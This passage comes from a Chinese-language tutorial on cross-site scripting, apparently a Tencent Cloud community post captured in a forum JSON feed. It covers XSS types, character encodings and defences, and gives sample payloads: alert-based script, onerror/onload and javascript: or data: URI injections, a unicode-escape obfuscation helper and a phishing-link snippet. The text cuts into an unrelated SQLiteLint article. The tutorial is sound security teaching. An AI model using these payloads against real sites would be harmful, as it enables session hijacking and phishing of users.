，是指攻破设备或者系统。</p>\n<p><strong>0DAY漏洞和0DAY攻击</strong></p>\n<p>零日漏洞或零时差漏洞（Zero-dayexploit）通常是指还没有补丁的安全漏洞。</p>\n<p>零日攻击或零时差攻击（Zero-dayattack）则是指利用这种漏洞进行的攻击。</p>\n<p>零日漏洞不但是黑客的最爱，掌握多少零日漏洞也成为评价黑客技术水平的一个重要参数。</p>\n<p><strong>CVE漏洞编号</strong></p>\n<p>Common Vulnerabilities and Exposures,公共漏洞和暴露，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。</p>\n<p>可以在<a href=\"https://cve.mitre.org/\">https://cve.mitre.org/</a>网站根据漏洞的CVE编号搜索该漏洞的介绍。也可以在中文社区http://www.scap.org.cn/上搜索关于漏洞的介绍</p>\n<p><strong>2. 漏洞攻击模型</strong></p>\n<p><img src=\"https://ask.qcloudimg.com/draft/467825/y03hg7anpz.png?imageView2/2/w/1620\" alt=\"img\">1.png</p>\n<p>上图为一个简单的攻击模型。攻击就是将Payload通过注入点注入到执行点执行的过程。过程顺畅就表明这个漏洞被利用了。</p>\n<h2>第二部分：XSS基础知识</h2>\n<p>基础知识看完，现在我们可以开始接触了解XSS基础了。XSS基础不好就不用研究了，大家没用共同语言。</p>\n<p><strong>1. 什么是XSS？</strong></p>\n<p>XSS全称Cross-site scripting，跨站脚本攻击。攻击者通过网站注入点注入恶意客户端可执行解析的Payload，当被攻击者访问网站时Payload通过客户端执行点执行来达到某些目的，比如获取用户权限、恶意传播、钓鱼等行为。</p>\n<p><strong>2. XSS的分类</strong></p>\n<p>不了解分类其实很难学好XSS，大家对XSS分类有很多误解，而且很多文章上都解释错的，这里我给出一个相对好的XSS分类。</p>\n<p><strong>2.1 按照Payload来源划分</strong></p>\n<p><strong>存储型XSS</strong></p>\n<p>Payload永久存在服务器上，所以也叫永久型XSS，当浏览器请求数据时，包含Payload的数据从服务器上传回并执行。</p>\n<p>过程如图：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/467825/mthm41fobb.png?imageView2/2/w/1620\" alt=\"img\">2.png</p>\n<p>存储型XSS例子：</p>\n<p>发表帖子内容包含Payload-&gt;存入数据库-&gt;被攻击者访问包含该帖子的页面Payload被执行</p>\n<p><strong>反射型XSS</strong></p>\n<p>又称非持久型XSS，第一种情况：Payload来源在客户端然后在客户端直接执行。第二种情况：客户端传给服务端的临时数据，直接回显到客户端执行。</p>\n<p>过程如图：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/467825/apre1wocza.png?imageView2/2/w/1620\" alt=\"img\">3.png</p>\n<p>反射型XSS例子 ：</p>\n<ol>\n<li>传播一个链接，这个链接参数中包含Payload-&gt;被攻击者访问这个链接Payload在客户端被执行。</li>\n<li>在客户端搜索框输入包含payload的内容-&gt;服务端回显一个页面提示搜索内容未找到，payload就被执行了。</li>\n</ol>\n<p><strong>2.2 按照Payload的位置划分</strong></p>\n<p><strong>DOM-based XSS</strong></p>\n<p>由客户端JavaScript代码操作DOM或者BOM造成Payload执行的漏洞。由于主要是操作DOM造成的Payload执行，所以叫做DOM-based XSS,操作BOM同样也可以造成Payload执行，所以这个名词有些不准确，其实叫JavaScript-based XSS更好。</p>\n<p>DOM-based的Payload不在html代码中所以给自动化漏洞检测带来了困难。</p>\n<p>过程如图：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/467825/ejwyb9sppp.png?imageView2/2/w/1620\" alt=\"img\">4.png</p>\n<p>反射型DOM-based XSS的例子：</p>\n<p>在客户端搜索框输入包含payload的内容-&gt;服务端回显一个页面提示搜索内容未找到，payload就被执行了。</p>\n<p>存储型DOM-based XSS的例子：</p>\n<p>从服务端接口中获取包含Payload的内容-&gt;JavaScript通过操作DOM、BOM造成Payload执行</p>\n<p><strong>HTML-based XSS</strong></p>\n<p>Payload包含在服务端返回的HTML中，在浏览器解析HTML的时候执行。这样的漏洞易于做自动化漏洞检测，因为Payload就在HTML里面。当然HTML-based XSS也有反射型和存储型的。</p>\n<p>过程如图：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/467825/ktnkjsaf9h.png?imageView2/2/w/1620\" alt=\"img\">5.png</p>\n<p>反射型HTML-based XSS的例子：</p>\n<p>在客户端搜索框输入包含payload的内容-&gt;服务端回显一个页面提示搜索内容未找到，payload包含在HTML被执行。</p>\n<p>存储型HTML-based XSS的例子：</p>\n<p>发表帖子内容包含Payload-&gt;存入数据库-&gt;被攻击者访问包含该帖子的页面Payload在HTML页面中被执行</p>\n<p><strong>3. XSS的攻击目的及危害</strong></p>\n<p>很多写出不安全代码的人都是对漏洞的危害没有清晰的认识，下图是2017 OWASP 网络威胁Top10：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/467825/cbm0opqiwv.jpg?imageView2/2/w/1620\" alt=\"img\">6_头图 自截取.jpg</p>\n<p>可以看到XSS在网络威胁中的地位举足轻重。</p>\n<p><strong>3.1 目的</strong></p>\n<ol>\n<li>cookie劫持</li>\n<li>篡改网页，进行钓鱼或者恶意传播</li>\n<li>网站重定向</li>\n<li>获取用户信息</li>\n</ol>\n<p><strong>3.2 危害</strong></p>\n<ol>\n<li>传播类危害</li>\n<li>系统安全威胁</li>\n</ol>\n<h2>第三部分：XSS攻击的Payload</h2>\n<p>这部分我们分析下攻击模型中的Payload,了解Payload必须了解编码，学习好JS也必须要了解好编码。要想真正做好网络安全编码是最基本的。</p>\n<p><strong>1. 编码基础</strong></p>\n<p>编码部分是最重要的虽然枯燥但必须要会。后面很多变形的Payload都建立在你的编码基础。这里通16进制编码工具让你彻底学会编码。</p>\n<p><strong>1.1 编码工具</strong></p>\n<p><strong>16进制查看器</strong>：方便查看文件16进制编码</p>\n<p>MAC:HEx Friend</p>\n<p>windows: HxD</p>\n<p><strong>编辑器Sublime</strong>：可以通过Sublime将文件保存不同编码类型</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/467825/qr6ot4ubfl.jpg?imageView2/2/w/1620\" alt=\"img\">7.jpg</p>\n<p><strong>1.2 ASCII</strong></p>\n<p><strong>定义</strong>：美国信息交换标准代码，是基于拉丁字母的一套计算机编码系统，主要用于显示现代英语和其他西欧语言。</p>\n<p><strong>编码方式</strong>：属于单子节编码。ASCII码一共规定了128个字符的编码，只占用了一个字节的后面7位，最前面的1位统一规定为0。0～31及127(共33个)是控制字符或通信专用字符。32～126(共95个)是字符(32是空格。</p>\n<p><strong>1.3 ISO-8859-1(Latin1)</strong></p>\n<p><strong>定义</strong>：Latin1是ISO-8859-1的别名,ISO-8859-1收录的字符除ASCII收录的字符外，还包括西欧语言、希腊语、泰语、阿拉伯语、希伯来语对应的文字符号。欧元符号出现的比较晚，没有被收录在ISO-8859-1当中。</p>\n<p><strong>编码方式</strong>：ISO-8859-1编码是单字节编码，向下兼容ASCII，其编码范围是0x00-0xFF，0x00-0x7F之间完全和ASCII一致，0x80-0x9F之间是控制字符，0xA0-0xFF之间是文字符号。</p>\n<p><strong>注意</strong>：ISO-8859-1编码表示的字符范围很窄，无法表示中文字符。但是，由于是单字节编码，和计算机最基础的表示单位一致，所以很多时候，仍旧使用ISO-8859-1编码来表示。比如，虽然”中文”两个字不存在iso8859-1编码，以gb2312编码为例，应该是”d6d0 cec4”两个字符，使用iso8859-1编码的时候则将它拆开为4个字节来表示：”d6 d0 ce c4”（事实上，在进行存储的时候，也是以字节为单位处理的）。所以mysql中latin1可以表示任何编码的字符。</p>\n<p><strong>Latin1与ASCII编码的关系</strong>：完全兼容ASCII。</p>\n<p><strong>1.4 Unicode编码(UCS-2)</strong></p>\n<p><strong>Code Point</strong>: 码点，简单理解就是字符的数字表示。一个字符集一般可以用一张或多张由多个行和多个列所构成的二维表来表示。二维表中行与列交叉的点称之为码点，每个码点分配一个唯一的编号，称之为码点值或码点编号。</p>\n<p><strong>BOM（Byte Order Mark）</strong>：字节序，出现在文件头部，表示字节的顺序，第一个字节在前，就是”大端方式”（Big-Endian），第二个字节在前就是”小端方式”（Little-Endian）。</p>\n<p>在Unicode字符集中有一个叫做”ZERO WIDTH NO-BREAK SPACE“的字符，它的码点是FEFF。而FFFE在Unicode中是不存在的字符，所以不应该出现在实际传输中。在传输字节流前，我们可以传字符”ZERO WIDTH NO-BREAK SPACE“表示大小端，因此字符”ZERO WIDTH NO-BREAK SPACE“又被称作BOM。</p>\n<p>BOM还可以用来表示文本编码方式，Windows就是使用BOM来标记文本文件的编码方式的。Mac上文件有没有BOM都可以。</p>\n<p>例如：\\u00FF :00是第一个字节，FF是第二个字节。和码点表示方式一样属于大端方式。</p>\n<p><strong>Unicode编码字符集</strong>：旨在收集全球所有的字符，为每个字符分配唯一的字符编号即代码点（Code Point），用 U+紧跟着十六进制数表示。所有字符按照使用上的频繁度划分为 17 个平面（编号为 0-16），即基本的多语言平面和增补平面。基本的多语言平面又称平面 0，收集了使用最广泛的字符，代码点从 U+0000 到 U+FFFF，每个平面有 216=65536 个码点；</p>\n<p><strong>Unicode编码</strong>：Unicode 字符集中的字符可以有多种不同的编码方式，如 UTF-8、UTF-16、UTF-32、压缩转换等。我们通常所说的Unicode编码是UCS-2 将字符编号（同 Unicode 中的码点）直接映射为字符编码，亦即字符编号就是字符编码，中间没有经过特别的编码算法转换。是定长双字节编码：因为我们UCS-2只包括本的多语言平面（U+0000 到 U+FFFF)。</p>\n<p><strong>UCS-2的BOM</strong>：大端模式：FEFF。小端模式：FFFE。</p>\n<p>文件保存成UTF-16 BE with BOM相当于UCS-2的大端模式，可以看到16进制开头为FEFF</p>\n<p><strong>Latin1与Unicode编码的关系</strong>：Latin1对应于Unicode的前256个码位。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/467825/7n6yvnx83m.png?imageView2/2/w/1620\" alt=\"img\">8.png</p>\n<p><strong>1.5 UTF-16</strong></p>\n<p><strong>定义及编码</strong>：UTF-16是Unicode的其中一个使用方式,在Unicode基本多文种平面定义的字符（无论是拉丁字母、汉字或其他文字或符号），一律使用2字节储存。而在辅助平面定义的字符，会以代理对（surrogate pair）的形式，以两个2字节的值来储存。是双字节编码。</p>\n<p><strong>UTF-16与UCS-2的关系</strong>：UTF-16可看成是UCS-2的父集。在没有辅助平面字符（surrogate code points）前，UTF-16与UCS-2所指的是同一的意思。但当引入辅助平面字符后，就称为UTF-16了。现在若有软件声称自己支援UCS-2编码，那其实是暗指它不能支援在UTF-16中超过2bytes的字集。对于小于0x10000的UCS码，UTF-16编码就等于UCS码。</p>\n<p><strong>UTF-16的BOM</strong>：大端模式：FEFF。小端模式：FFFE。</p>\n<p><strong>1.6 UTF-8</strong></p>\n<p><strong>定义及编码</strong>：UTF-8就是在互联网上使用最广的一种Unicode的实现方式，这是为传输而设计的编码，并使编码无国界，这样就可以显示全世界上所有文化的字符了。UTF-8最大的一个特点，就是它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度，当字符在ASCII码的范围时，就用一个字节表示，保留了ASCII字符一个字节的编码作为它的一部分，注意的是unicode一个中文字符占2个字节，而UTF-8一个中文字符占3个字节）。从unicode到utf-8并不是直接的对应，而是要过一些算法和规则来转换。</p>\n<table>\n<thead>\n<tr>\n<th>Unicode符号范围</th>\n<th>UTF-8编码方式(十六进制)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0000 0000-0000 007F</td>\n<td>0xxxxxxx</td>\n</tr>\n<tr>\n<td>0000 0080-0000 07FF</td>\n<td>110xxxxx 10xxxxxx</td>\n</tr>\n<tr>\n<td>0000 0800-0000 FFFF</td>\n<td>1110xxxx 10xxxxxx 10xxxxxx</td>\n</tr>\n<tr>\n<td>0001 0000-0010 FFFF</td>\n<td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>\n</tr>\n</tbody>\n</table>\n<p><strong>UTF8的BOM</strong>：EFBBBF。UTF-8不存在字符序列的问题，但是可以用用BOM表示这个文件是一个UTF-8文件。</p>\n<p>文件保存成UTF-8 BE with BOM，可以看到16进制开头为EFBBBF</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/467825/y3s8unh04a.png?imageView2/2/w/1620\" alt=\"img\">9.png</p>\n<p><strong>1.7 GBK/GB2312</strong></p>\n<p><strong>定义及编码</strong>：GB2312是最早一版的汉字编码只包含6763汉字，GB2312只支持简体字而且不全，显然不够用。GBK编码，是对GB2312编码的扩展，完全兼容GB2312标准，支持简体字繁体字，包含全部中文字符。GBK编码采用单双字节编码方案，单字节和Latin1一致，双字节是汉字部分，其编码范围：8140－FEFE，剔除xx7F码位，共23940个码位。</p>\n<p><strong>GBK与Latin1的关系</strong>：GBK单字节编码区和Latin1编码一致。</p>\n<p><strong>GBK与Unicode的关系</strong>：GBK与Unicode字符集编码不同但是兼容的。如＂汉＂的Unicode值与GBK虽然是不一样的，假设Unicode为a040，GBK为b030，但是可以对应转化的。汉字的Unicode区：4E00-u9FA5。</p>\n<p><strong>GBK与UTF-8</strong>：GBK汉字采用双字节编码比在UTF-8中的三字节要小。但是UTF-8更通用。GBK与UTF-8转化：GBK—&gt; Unicode —&gt; UTF8</p>\n<p><strong>2. 前端中的编码</strong></p>\n<p>有了编码基础就可以来认识一下前端中的编码，这样你才能真正认识Payload。我这里的应该是总结最全的。</p>\n<p><strong>2.1 Base64</strong></p>\n<p>Base64可以用来将binary的字节序列数据编码成ASCII字符序列构成的文本。使用时，在传输编码方式中指定Base64。使用的字符包括大小写拉丁字母各26个、数字10个、加号+和斜杠/，共64个字符及等号=用来作为后缀用途。所以总共65个字符。</p>\n<p>将3字节的数据，先后放入一个24位的缓冲区中，先来的字节占高位。数据不足3字节的话，于缓冲器中剩下的比特用0补足。每次取出6bit对原有数据用Base64字符作为编码后的输出。编码若原数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。可以看出Base64编码数据大约是原来数据的3/4。</p>\n<p>标准的Base64并不适合直接放在URL里传输，因为URL编码器会把标准Base64中的/和+字符变为形如%XX的形式，而这些%号在存入数据库时还需要再进行转换，因为ANSI SQL中已将%号用作通配符。为解决此问题，可采用一种用于URL的改进Base64编码，它不在末尾填充=号，并将标准Base64中的+和/分别改成了-和_，这样就免去了在URL编解码和数据库存储时所要做的转换，避免了编码信息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。</p>\n<p>window.btoa/window.atob base64编码(binary to ascii)和解码仅支持Latin1字符集。</p>\n<p><strong>2.2 JS转义字符</strong></p>\n<p>js字符字符串中包含一些反斜杠开头的特殊转义字符，用来表示非打印符、其他用途的字符还可以转义表示unicode、Latin1字符。</p>\n<table>\n<thead>\n<tr>\n<th>转义字符</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>\\’</td>\n<td>单引号</td>\n</tr>\n<tr>\n<td>\\”</td>\n<td>双引号</td>\n</tr>\n<tr>\n<td>&amp;</td>\n<td>和号</td>\n</tr>\n<tr>\n<td>\\</td>\n<td>反斜杠</td>\n</tr>\n<tr>\n<td>\\n</td>\n<td>换行符</td>\n</tr>\n<tr>\n<td>\\r</td>\n<td>回车符</td>\n</tr>\n<tr>\n<td>\\t</td>\n<td>制表符</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>退格符</td>\n</tr>\n<tr>\n<td>\\f</td>\n<td>换页符</td>\n</tr>\n<tr>\n<td>\\n … \\nnn</td>\n<td>由一位到三位八进制数（1到377）指定的Latin-1字符</td>\n</tr>\n<tr>\n<td>\\xnn</td>\n<td>以16进制nn（n:0~F)表示一个Latin1字符。\\x41表示字符A</td>\n</tr>\n<tr>\n<td>\\unnnn</td>\n<td>以16进制nnnn(n:0~F)表示一个Unicode字符。只限于码点在\\u0000~\\uFFFF范围内</td>\n</tr>\n<tr>\n<td>\\u{n} … \\u{nnnnnn}</td>\n<td>Unicode码点值表示一个Unicode字符</td>\n</tr>\n</tbody>\n</table>\n<p><strong>特别注意：</strong></p>\n<ol>\n<li>换行符\\n在innerHTML使用只会展示一个空格并不会换行。</li>\n<li>通过\\n、\\u和\\x可以代表任意unicode字符和Latin1字符。通过这个可以对js加密保证js安全和进行隐蔽攻击。</li>\n</ol>\n<p><strong>例子：</strong></p>\n<pre class=\"prettyprint language-js\"><code>function toUnicode(theString) {  &#x2F;&#x2F;字符串转换为unicode编码字符串，切记这个字符串是复制用的，不是让你拿来直接执行的。\n var unicodeString = &#x27;&#x27;;\n for (var i = 0; i &lt; theString.length; i++) {\n  var theUnicode = theString.charCodeAt(i).toString(16).toUpperCase();\n  while (theUnicode.length &lt; 4) {\n    theUnicode = &#x27;0&#x27; + theUnicode;\n  }\n  theUnicode = &#x27;\\\\u&#x27; + theUnicode;\n  unicodeString += theUnicode;\n }\n return unicodeString;\n}\nvar xssStr = &quot;alert(&#x27;xss&#x27;)&quot;;\nvar xssStrUnicode = toUnicode(xssStr);\n&#x2F;&#x2F;输出：&quot;\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u002&quot;\neval(&quot;\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u002&quot;); &#x2F;&#x2F;弹出xss弹窗\n</code></pre><p><strong>2.3 URL编码</strong></p>\n<p>RFC 1738做出规定”只有字母和数字0-9a-zA-Z、一些特殊符号”$-_.+!*’(),”不包括双引号、以及某些保留字，才可以不经过编码直接用于URL”。所以当链接中包含中文或者其他不符合规定的字符的时候都需要经过编码的。然而由于浏览器厂商众多，对url进行编码的形式多种多样，如果不对编码进行统一处理，会对代码开发造成很大的影响，出现乱码现象。</p>\n<p><strong>URL编码规则</strong>：需要编码的字符转换为UTF-8编码，然后在每个字节前面加上%。</p>\n<p><strong>例如：</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x27;牛&#x27;--&gt;UTF-8编码E7899B--&gt;URL编码是%E7%89%9B\n</code></pre><p>JS为我们提供了3个对字符串进行URL编码的方法：escape ，encodeURI，encodeURIComponent</p>\n<p><strong>escape</strong>：由于eccape已经被建议放弃所以大家就不要用了</p>\n<p><strong>encodeURI</strong>：encodeURI不编码的82个字符：!#$&amp;’()*+,/:;=?@-._~0-9a-zA-Z，从中可以看不会对url中的保留字符进行编码，所以适合url整体编码</p>\n<p>encodeURIComponent：这个对于我们来说是最有用的一个编码函数，encodeURIComponent不编码的字符有71个：!， ‘，(，)，*，-，.，_，~，0-9，a-z，A-Z。</p>\n<p>可以看出对url中的保留字进行的编码，所以当传递的参数中</p>\n<p>包含这些url中的保留字（@，&amp;,=)，就可以通过这个方法编码后传输</p>\n<p>这三个方法对应的解码方法： <strong>unescape、decodeURI、decodeURIComponent</strong></p>\n<p><strong>2.4 HTML字符实体</strong></p>\n<p>HTML中的预留字符必须被替换为字符实体。这样才能当成字符展示，否则会当成HTML解析。</p>\n<p><strong>字符实体编码规则</strong>：转义字符 = &amp;#+ascii码; = &amp;实体名称;</p>\n<p>XSS字符串需要防御字符的实体转换表：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/467825/6iay6fwxv5.png?imageView2/2/w/1620\" alt=\"img\">10.png</p>\n<p>转化方法：</p>\n<pre class=\"prettyprint language-js\"><code>function encodeHTML (a) {\n return String(a)\n   .replace(&#x2F;&amp;&#x2F;g, &quot;&amp;&quot;)\n   .replace(&#x2F;&lt;&#x2F;g, &quot;&lt;&quot;)\n   .replace(&#x2F;&gt;&#x2F;g, &quot;&gt;&quot;)\n   .replace(&#x2F;&quot;&#x2F;g, &quot;&quot;&quot;)\n   .replace(&#x2F;&#x27;&#x2F;g, &quot;&#x27;&quot;);\n};\n</code></pre><p><strong>2.5 页面编码</strong></p>\n<p>页面编码设置：</p>\n<p>&lt;meta charset=“UTF-8”&gt;</p>\n<p>&lt;meta http-equiv=“Content-Type” content=“text/html; charset=utf-8” /&gt;</p>\n<p>脚本编码设置：</p>\n<p>&lt;script type=“text/javascript” src=“myscripts.js” charset=“UTF-8”&gt;&lt;/script&gt;</p>\n<p><strong>注意：要想JS即可在UTF-8中正常使用又可以在GBK中正常使用，可以对JS中所有包含中文的字符串做字符转义。</strong></p>\n<p>例子：</p>\n<pre class=\"prettyprint language-js\"><code>alert(&quot;网络错误&quot;);     &#x2F;&#x2F;弹出网络错误\n</code></pre><pre class=\"prettyprint language-js\"><code>alert(&quot;\\u7f51\\u7edc\\u9519\\u8bef&quot;); &#x2F;&#x2F;弹出网络错误\n</code></pre><p><strong>3. Payload的分类</strong></p>\n<p>现在可以认识Payload的了，我不得不说这里对Payload的分类可以很好的让你认识Payload。也帮助你更好的对应到执行点。</p>\n<p><strong>3.1 原子Payload</strong></p>\n<p>最低层级的Payload。</p>\n<p><strong>javascript代码片段</strong></p>\n<p>可在eval、setTimeout、setInterval中直接执行，也可通过HTML等构成高阶Payload</p>\n<p><strong>javascript：javascript伪协议</strong></p>\n<p>结构：javascript:+js代码。可以在a标签的href属性被点击和window.location.href赋值的时候执行。</p>\n<p><strong>DATA URI协议</strong></p>\n<p>DATA URI结构：data:, 。DATA URI数据在包含在iframe的src属性和object data属性中将会变成可执行的Payload.</p>\n<p><strong>字符串转义变种javascript代码片段</strong></p>\n<p>unicode或者Latin-1表示字符串。</p>\n<pre class=\"prettyprint language-js\"><code>eval(&quot;\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u002&quot;); &#x2F;&#x2F;可执行的JS\n</code></pre><p><strong>3.2 纯HTMLPayload</strong></p>\n<p>这种Payload特点不具有可执行的JS，但是存在传播风险，可以把别的站点注入到被攻击网站。</p>\n<p><strong>包含链接跳转的HTML片段</strong></p>\n<p>主要是传播危害</p>\n<pre class=\"prettyprint language-js\"><code>&lt;a href=&quot;http:&#x2F;&#x2F;ha.ck&quot;&gt;哈哈，我来钓鱼了&lt;&#x2F;a&gt;\n</code></pre><p><strong>3.3 包含原子Payload的HTML片段Payload</strong></p>\n<p><strong>script标签片段</strong></p>\n<p>script标签片段这种Payload可以引入外部JS或者可直接执行的script。这种Payload一般不能通过直接复制给innerHTML执行，不过在IE上可以。不过通过document.write是可以执行。</p>\n<p>例子：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; Payload原始值:data:text&#x2F;html,&lt;script&gt;alert(&#x27;xss&#x27;);&lt;&#x2F;script&gt;\n</code></pre><pre class=\"prettyprint language-js\"><code>var inputStr =&quot;&lt;script&gt;alert(&#x27;xss&#x27;);&lt;\\&#x2F;script&gt;&quot;;\n</code></pre><pre class=\"prettyprint language-js\"><code>document.write(inputStr);\n</code></pre><p><strong>包含事件处理的HTML片段</strong></p>\n<p>例如：包含img的onerror, svg的onload,input的onfocus等的HTML片段，都可以变成可执行的Payload。</p>\n<pre class=\"prettyprint language-js\"><code>var inputStr =&quot;&lt;img src=x onerror=alert(&#x27;xss&#x27;);&gt;&quot;;\n</code></pre><pre class=\"prettyprint language-js\"><code> var inputStr =&quot;&lt;svg&#x2F;onload=alert(&#x27;xss&#x27;)&gt;&quot;;\n</code></pre><pre class=\"prettyprint language-js\"><code> var inputStr =&quot;&lt;input autofocus onfocus=alert(&#x27;xss&#x27;)&gt;&quot;;\n</code></pre><pre class=\"prettyprint language-js\"><code> xssDom.innerHTML = inputStr;\n</code></pre><p><strong>包含可执行JS属性的HTML片段</strong></p>\n<ol>\n<li>javascript伪协议</li>\n</ol>\n<pre class=\"prettyprint language-js\"><code>xssLink.setAttribute(&quot;href&quot;,&quot;javascript:alert(&#x27;xss&#x27;)&quot;)&#x2F;&#x2F;点击可触发\n</code></pre><pre class=\"prettyprint language-js\"><code>var inputStr = &quot;javascript:alert(&#x27;xss&#x27;)&quot;;\n</code></pre><pre class=\"prettyprint language-js\"><code>window.location.href = inputStr;\n</code></pre><ol>\n<li>DATA URI</li>\n</ol>\n<p>例子：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; Payload原始值:data:text&#x2F;html,&lt;script&gt;alert(&#x27;xss&#x27;);&lt;&#x2F;script&gt;\n</code></pre><pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;var inputStr = &#x27;&lt;iframe src=&quot;data:text&#x2F;html,&lt;script&gt;alert(&quot;xss&quot;);&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;&#x27;;\n</code></pre><pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; var inputStr = &#x27;&lt;object data=&quot;data:text&#x2F;html;base64,ZGF0YTp0ZXh0L2h0bWwsPHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+&quot;&gt;&lt;&#x2F;object&gt;&#x27;;\n</code></pre><pre class=\"prettyprint language-js\"><code>xssDom.innerHTML = inputStr; &#x2F;&#x2F;弹出alert(&quot;xss&quot;)\n</code></pre><p>这里只是介绍了主要的Payload，还有很多不常见的Payload。</p>\n<h2>第四部分：XSS攻击模型分析</h2>\n<p>这部分我们根据漏洞攻击模型分析一下XSS的执行点和注入点。分析这两点其实就是找漏洞的过程。</p>\n<p><strong>1. XSS漏洞执行点</strong></p>\n<ol>\n<li>页面直出Dom</li>\n<li>客户端跳转链接： location.href / location.replace() / location.assign()</li>\n<li>取值写入页面：innerHTML、document.write及各种变种。这里主要会写入携带可执行Payload的HTML片段。</li>\n<li>脚本动态执行：eval、setTimeout()、setInterval()</li>\n<li>不安全属性设置：setAttribute。不安全属性前面见过：a标签的href、iframe的src、object的data</li>\n<li>HTML5 postMessage来自不安全域名的数据。</li>\n<li>有缺陷的第三方库。</li>\n</ol>\n<p><strong>2. XSS漏洞注入点</strong></p>\n<p>看看我们可以在哪些位置注入我们的Payload</p>\n<ol>\n<li>服务端返回数据</li>\n<li>用户输入的数据</li>\n<li>链接参数：window.location对象三个属性href、search、search</li>\n<li>客户端存储:cookie、localStorage、sessionStorage</li>\n<li>跨域调用：postMessage数据、Referer、<a href=\"http://window.name\">window.name</a></li>\n</ol>\n<p>上面内容基本包含了所有的执行点和注入点。对大家进行XSS漏洞攻防很有帮助。</p>\n<h2>第五部分 XSS攻击防御策略</h2>\n<p><strong>1. 腾讯内部公共安全防御及应急响应</strong></p>\n<ol>\n<li>接入公共的DOM XSS防御JS</li>\n<li>内部漏洞扫描系统扫描</li>\n<li>腾讯安全应急响应中心：安全工作者可以通过这个平台提交腾讯相关的漏洞，并根据漏洞评级获得奖励。</li>\n<li>重大故障应急响应制度。</li>\n</ol>\n<p><strong>2. 安全编码</strong></p>\n<p>2.1 执行点防御方法</p>\n<table>\n<thead>\n<tr>\n<th>执行点</th>\n<th>防御</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>页面直出Dom</td>\n<td>服务端XSS过滤</td>\n</tr>\n<tr>\n<td>客户端跳转链接</td>\n<td>域名白名单（例如：只允许qq.com域）、链接地址XSS过滤</td>\n</tr>\n<tr>\n<td>取值写入页面</td>\n<td>客户端XSS过滤</td>\n</tr>\n<tr>\n<td>脚本动态执行</td>\n<td>确保执行Js字符串来源可信</td>\n</tr>\n</tbody>\n</table>\n<p>|</p>\n<p>| 不安全属性设置 | 内容XSS过滤，包含链接同客户端跳转链接 |</p>\n<p>|HTML5 postMessage|origin限制来源|</p>\n<p>| 有缺陷的第三方库 | 不使用</p>\n<p><strong>2.2 其他安全防御手段</strong></p>\n<ol>\n<li>对于Cookie使用httpOnly</li>\n<li>在HTTP Header中使用Content Security Policy</li>\n</ol>\n<p><strong>3. 代码审查</strong></p>\n<p>总结XSS检查表做代码自测和检视</p>\n<p><strong>4. 自动化检测XSS漏洞的工具</strong></p>\n<p>手工检测XSS漏洞是一件比较费时间的事情，我们能不能写一套自动检测XSS自动检测工具。竟然我知道了注入点、执行点、Payload自动化过程是完全有可能的。</p>\n<p>XSS自动化检测的难点就在于DOM型XSS的检测。因为前端JS复杂性较高，包括静态代码分析、动态执行分析都不容易等。</p>\n<h2>第六部分 总结</h2>\n<p>上面内容文字比较多，看完还是很累的，总结起来就一句话：安全大于一切，不要心存侥幸，希望以上内容对您有帮助，不过以上内容仅代表个人理解，如有不对欢迎指正讨论。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"每一个工程师都要学的安全测试，老板再也不用担心服务器被黑","last_reply_at":"2018-12-18T10:05:00.444Z","good":false,"top":false,"reply_count":2,"visit_count":676,"create_at":"2018-12-18T03:55:26.349Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c18c4d97ec239239ff581fa","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>SQLite 在移动端开发中广泛使用，其使用质量直接影响到产品的体验。</p>\n<p>常见的 SQLite 质量监控一般都是依赖上线后反馈的机制，比如耗时监控或者用户反馈。这种方式问题是：</p>\n<ul>\n<li>事后发现，负面影响已经发生。</li>\n<li>关注的只是没这么差。eg. 监控阈值为 500ms ，那么一条可优化为 20ms 而平均耗时只有 490ms 的 sql 就被忽略了。</li>\n</ul>\n<p>能否在上线前就进行SQLite使用质量的监控？于是我们尝试开发了一个工具: SQLiteLint 。虽然名带 “lint ” ，但并不是代码的静态检查，而是在 APP 运行时对 sql 语句、执行序列、表信息等进行分析检测。而和 “lint” 有点类似的是：在开发阶段就介入，并运用一些最佳实践的规则来检测，从而发现潜在的、可疑的 SQLite 使用问题。</p>\n<p>本文会介绍 SQLiteLint 的思路，也算是 SQLite 使用经验的分享，希望对大家有所帮助。</p>\n<h2><strong>简述</strong></h2>\n<p>SQLiteLint 在 APP 运行时进行检测，而且大部分检测算法与数据量无关即不依赖线上的数据状态。只要你触发了某条 sql 语句的执行，SQLiteLint 